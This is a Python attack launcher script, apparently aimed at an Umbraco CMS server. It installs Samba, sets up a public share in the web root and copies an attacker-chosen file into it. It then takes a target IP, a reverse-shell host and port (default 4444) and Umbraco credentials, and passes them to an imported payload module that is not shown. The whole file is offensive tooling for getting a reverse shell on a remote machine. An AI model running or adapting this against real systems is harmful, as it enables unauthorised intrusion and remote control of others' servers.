#!/usr/bin/python3

import apt_pkg
import sys
import os
import stat
import argparse
from custompayload import Payload

pkg_name = "samba"
smb_pub_path = "/var/www/html/pub"
smb_conf_path = "/etc/samba/smb.conf"

apt_pkg.init_config()
apt_pkg.init_system()

cache = apt_pkg.Cache()
depcache = apt_pkg.DepCache(cache)

def setup():

    pkg = cache[pkg_name]
    
    # check if package is installed
    if pkg and pkg.inst_state == apt_pkg.CURSTATE_NOT_INSTALLED:
        depcache.mark_install(pkg)  
        print("{pkg_name} is installed, we can continue...".format(pkg_name=pkg_name))

    # check if directory exists, if not create it
    try:
        if not os.path.isdir(smb_pub_path):
            os.mkdir(smb_pub_path)
        else:
            print("Directory already exists! Checking permissions...")

            st = os.stat(smb_pub_path)
            
            # set access to directory 
            if not oct(st.st_mode)[-3:] == "555":
                os.chmod(smb_pub_path, 0o555)
            
            # recursively chown all contents
            # this is done in the event the staged smb directory already exists
            r_chown(smb_pub_path)
    except OSError:
        print("Error unable to create dir")
        sys.exit(-1)

    # copy the smb config that was setup for this job
    if os.path.isfile(smb_conf_path):
        os.popen("cp {smb_conf_path} {smb_conf_path}.bckup".format(smb_conf_path=smb_conf_path))
    os.popen("cp ./smb.conf {smb_conf_path}".format(smb_conf_path=smb_conf_path))
    
    # once config is placed, restart the service to load it
    if os.system("sudo service smbd restart") == 1:
        print("Error restarting smbd service\n")
        sys.exit(-1)


def r_chown(p):
    for root, dirs, files in os.walk(p):
        for d in dirs:
            os.chown(os.path.join(root, d), 65534, 65534)
        for f in files:
            os.chown(os.path.join(root, f), 65534, 65534)

def smb_restart():
    if os.system("sudo service smbd restart") == 1:
        print("Error restarting smbd service\n")
        sys.exit(-1)

if __name__ == "__main__":

    parser = argparse.ArgumentParser()
    parser.add_argument("--target", "-t", required=True, help="Target IP address", type=str)        
    parser.add_argument("--host", "-x", required=True, help="IP for reverse shell", type=str)
    parser.add_argument("--port", "-p", default="4444", help="Port for reverse shell", type=str)
    parser.add_argument("--load", "-l",  help="Path to file or script to provide to the public", type=str)
    parser.add_argument("--user", "-P", required=True, help="User name for Umbraco", type=str)
    parser.add_argument("--passw", "-U", required=True, help="Password for Umbraco", type=str)
    args = parser.parse_args()
   
    setup()

    if args.load:
        os.popen("cp {load} {dest}".format(load=args.load,dest=smb_pub_path))

    p = Payload(args.target, args.host, args.port, args.user, args.passw)
    p.execute()
